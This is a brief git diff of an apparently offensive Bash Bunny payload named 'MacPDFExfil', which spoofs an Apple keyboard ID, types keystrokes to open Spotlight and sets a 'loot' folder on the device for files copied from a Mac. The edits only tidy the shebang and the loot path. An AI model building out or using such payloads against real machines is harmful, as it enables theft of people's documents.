@@ -1,4 +1,4 @@
-﻿#!/bin/bash
+#!/bin/bash
 #
 # Title:         MacPDFExfil
 # Author:        k1ul3ss
@@ -14,7 +14,7 @@ ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
 dev_name="BashBunny"
 
 # loot directory
-lootdir="/Volumes/$dev_name/loot/"
+lootdir="/Volumes/$dev_name/loot/MacPDFExfil/"
 
 QUACK GUI SPACE
 QUACK DELAY 1000
